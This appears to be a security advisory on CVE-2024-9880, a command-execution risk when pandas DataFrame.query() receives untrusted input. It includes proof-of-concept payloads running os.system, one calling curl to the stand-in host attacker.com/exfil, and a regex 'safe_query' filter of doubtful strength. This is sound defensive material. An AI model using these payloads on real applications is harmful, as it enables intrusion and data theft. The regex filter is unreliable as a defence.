# CVE-2024-9880 - Arbitrary Command Execution in Pandas Library due to `pandas.DataFrame.query()`

## Overview

**CVE-2024-9880** refers to an **arbitrary command execution vulnerability** when the `pandas.DataFrame.query()` method is used with **unsanitized user input**. The issue arises because `query()` internally uses Python’s `eval()` to interpret expressions passed to it, which can lead to **remote code execution (RCE)** in affected applications.

![alt text](image.png)

Reference: https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.query.html


---

## Root Cause Analysis

* `DataFrame.query()` was designed to take string expressions and evaluate them using the local Python environment.
* When developers pass **user-controlled input** directly to this method, arbitrary Python expressions can be evaluated.
* This can allow attackers to execute shell commands, import modules, or manipulate runtime behavior.

```python
df.query('__import__("os").system("ping google.com")')
```

* This behavior is **documented**, expected, and intended by design — but it becomes dangerous when misused in exposed APIs.

---

## Exploitation Example (PoC)

```python
import pandas as pd

df = pd.DataFrame({'name': ['shlok', 'bob'], 'score': [100, 50]})

payload = '__import__("os").system("curl http://attacker.com/exfil")'

df.query(payload)
```

If an application accepts this input through a web form, CLI input, or API endpoint and passes it unfiltered into `query()`, an attacker can run **arbitrary system commands**.

---

## Affected Versions

* All versions of `pandas` that implement `DataFrame.query()` are affected **when used improperly**.
* No patches have been released because this is **expected behavior**.
* The pandas team has updated documentation to include clear **security warnings**.

[Official documentation](https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.query.html)

>  “This method uses the `numexpr` expression evaluator by default. This can be changed by setting the `engine` parameter. **Do not use this function with untrusted input.**”

---

## CVE and Advisory Status

| Field       | Value                                                   |
| ----------- | ------------------------------------------------------- |
| CVE ID      | CVE-2024-9880                                           |
| CWE         | CWE-77: Improper Neutralization of OS Command Injection |
| Snyk ID     | SNYK-PYTHON-PANDAS-8549481                              |
| Reported by | Aftersnows\@360                                         |
| Published   | 25 Dec 2024                                             |
| Status      | Advisory Revoked / CVE Expected to Be Rejected          |

---

## Recommendations

### Safe Usage Practices

* **NEVER** pass untrusted input to `.query()` or any API that evaluates strings (e.g., `eval()`, `exec()`, `eval(expr, globals)`).
* Use **parameterized filters** or **boolean indexing** instead:

```python
df[df['score'] > 50]  # Safe alternative to query("score > 50")
```

* If dynamic expressions must be supported, restrict allowed inputs via regex or expression parsers.

### Sanitize Input (if necessary)

If user input is absolutely necessary:

```python
import re

def safe_query(expression):
    # Allow only alphanumeric, operators, and space
    if re.match(r'^[\w\s><=.!&|()]+$', expression):
        return df.query(expression)
    else:
        raise ValueError("Unsafe expression")

safe_query("score > 50")  # OK
safe_query("__import__('os').system('ls')")  # Blocked
```

---

## Developer Awareness

This CVE is a **developer education** issue more than a code defect. It serves as a reminder that **convenient features can become vulnerabilities** when used without validation.

**Key takeaway:** Treat any string-evaluating function as inherently dangerous in a security context.

---

## Conclusion

While **CVE-2024-9880** highlights a critical **RCE vector**, it is not a flaw in `pandas` — rather, it's a dangerous misuse of a documented feature. No patch is required, but developers must ensure they do not expose `query()` to user input.
